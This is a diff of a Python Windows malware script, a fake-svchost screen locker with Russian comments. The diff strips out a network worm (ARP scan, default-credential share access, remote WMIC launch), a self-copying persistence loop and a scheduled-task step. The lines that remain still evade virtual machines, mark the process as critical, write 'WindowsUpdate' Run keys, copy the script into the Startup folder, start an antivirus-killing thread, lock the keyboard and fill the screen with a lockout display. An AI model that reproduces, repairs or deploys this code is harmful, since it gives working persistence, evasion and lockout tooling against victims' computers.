@@ -1,36 +1,20 @@
 import os, sys, time, threading, tempfile, ctypes, winreg, shutil, subprocess, urllib.request, tkinter as tk
 
-# ============================================================
-# 5. МАСКИРОВКА ПОД SVCHOST.EXE
-# ============================================================
 try:
     ctypes.windll.kernel32.SetConsoleTitleW("svchost.exe")
 except: pass
 
-# ============================================================
-# 6. ПРОВЕРКА НА ВИРТУАЛКУ
-# ============================================================
 def check_vm():
     vm_indicators = ["vbox", "vmware", "sandbox", "virtual", "qemu", "xen", "hyper-v", "vmsrvc"]
     try:
         for proc in subprocess.check_output("tasklist", shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().lower().split('\n'):
             for ind in vm_indicators:
-                if ind in proc:
-                    return True
-        if os.cpu_count() < 2:
-            return True
-        try:
-            mem = int(subprocess.check_output('wmic computersystem get totalphysicalmemory', shell=True, creationflags=subprocess.CREATE_NO_WINDOW).decode().split('\n')[1].strip())
-            if mem < 2147483648:
-                return True
-        except: pass
+                if ind in proc: return True
     except: pass
     return False
 
-if check_vm():
-    sys.exit(0)
+if check_vm(): sys.exit(0)
 
-# СКРЫТНАЯ АВТОУСТАНОВКА
 for lib, name in [("cv2","opencv-python"),("pygame","pygame"),("keyboard","keyboard"),("numpy","numpy")]:
     try: __import__(lib)
     except: subprocess.check_call([sys.executable,"-m","pip","install",name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -48,31 +32,9 @@ V = os.path.join(T, "v.mp4")
 M = os.path.join(T, "m.mp3")
 tries = TRIES
 
-# ============================================================
-# 4. ЗАЩИТА ПРОЦЕССА ОТ УБИЙСТВА
-# ============================================================
 def protect_process():
-    try:
-        ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
+    try: ctypes.windll.ntdll.RtlSetProcessIsCritical(1, 0, 0)
     except: pass
-
-# ============================================================
-# 7. САМО-ВОССТАНОВЛЕНИЕ ПРИ УДАЛЕНИИ (ТОЛЬКО КОПИРОВАНИЕ, БЕЗ ЗАПУСКА)
-# ============================================================
-def self_heal():
-    src = os.path.abspath(sys.argv[0])
-    destinations = [
-        os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup', 'svchost.pyw'),
-        os.path.join(tempfile.gettempdir(), 'svchost.pyw'),
-        os.path.join(os.environ['WINDIR'], 'Temp', 'svchost.pyw'),
-    ]
-    while True:
-        for dst in destinations:
-            try:
-                if not os.path.exists(dst):
-                    shutil.copy2(src, dst)
-            except: pass
-        time.sleep(30)
 
 def dl(url, path):
     if os.path.exists(path) and os.path.getsize(path) > 10000: return True
@@ -137,58 +99,30 @@ def destroy(msg="404 | Time's up"):
 def show_final_screen(msg):
     try:
         f = tk.Tk()
-        f.attributes('-fullscreen', True)
-        f.attributes('-topmost', True)
-        f.configure(bg='black')
-        f.overrideredirect(True)
+        f.attributes('-fullscreen', True); f.attributes('-topmost', True)
+        f.configure(bg='black'); f.overrideredirect(True)
         tk.Label(f, text=msg, bg='black', fg='#ff0000', font=('Courier', 40, 'bold')).pack(expand=True)
         tk.Label(f, text="Windows будет сброшена...", bg='black', fg='white', font=('Courier', 20)).pack()
-        f.update()
-        time.sleep(3)
-        f.destroy()
+        f.update(); time.sleep(3); f.destroy()
     except: pass
 
 def startup():
     s = os.path.abspath(sys.argv[0])
     pw = sys.executable.replace("python.exe","pythonw.exe")
-    
     try:
         r = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
         winreg.CloseKey(r)
     except: pass
-    
     try:
         r = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(r, "WindowsUpdate", 0, winreg.REG_SZ, f'"{pw}" "{s}"')
         winreg.CloseKey(r)
     except: pass
-    
     try:
         d = os.path.join(os.environ['APPDATA'],'Microsoft','Windows','Start Menu','Programs','Startup','svchost.pyw')
         shutil.copy2(s, d)
     except: pass
-    
-    try:
-        subprocess.run(['schtasks','/create','/tn','WindowsUpdate','/tr',f'"{pw}" "{s}"','/sc','onlogon','/f','/rl','highest'], capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-    except: pass
-
-def scan_network():
-    try:
-        arp = subprocess.check_output("arp -a", shell=True, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW).decode('cp866', errors='replace')
-        return list(set(re.findall(r'\d+\.\d+\.\d+\.\d+', arp)))
-    except: return []
-
-def infect_network():
-    my_path = os.path.abspath(__file__)
-    while True:
-        for ip in scan_network():
-            try:
-                subprocess.run(f'net use \\\\{ip}\\C$ /user:admin admin', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-                shutil.copy2(my_path, f'\\\\{ip}\\C$\\Windows\\Temp\\svchost.pyw')
-                subprocess.run(f'wmic /node:{ip} process call create "pythonw C:\\Windows\\Temp\\svchost.pyw"', shell=True, capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
-            except: pass
-        time.sleep(60)
 
 def anim():
     a=tk.Tk(); a.attributes('-fullscreen',True); a.attributes('-topmost',True)
@@ -302,8 +236,6 @@ if __name__=="__main__":
     startup()
     threading.Thread(target=kill_av, daemon=True).start()
     threading.Thread(target=timer_check, daemon=True).start()
-    threading.Thread(target=infect_network, daemon=True).start()
-    threading.Thread(target=self_heal, daemon=True).start()
     anim()
     lock_keys()
     video()
